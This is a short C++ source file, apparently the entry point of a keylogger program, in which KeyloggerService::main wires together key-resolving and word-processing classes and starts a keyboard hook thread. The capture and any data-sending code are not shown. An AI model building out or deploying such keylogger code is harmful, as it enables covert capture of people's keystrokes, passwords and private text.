#include "KeyloggerService.h"

KeyloggerService::KeyloggerService() {}

int KeyloggerService::main()
{
    KeyResolver keyResolver;
    NullGuardProcessor gProcessor;
    WordProcessor wProcessor(&gProcessor);
    WorkerThread wc(&keyResolver, &wProcessor);
    wc.CreateHookThread();
    return 0;
}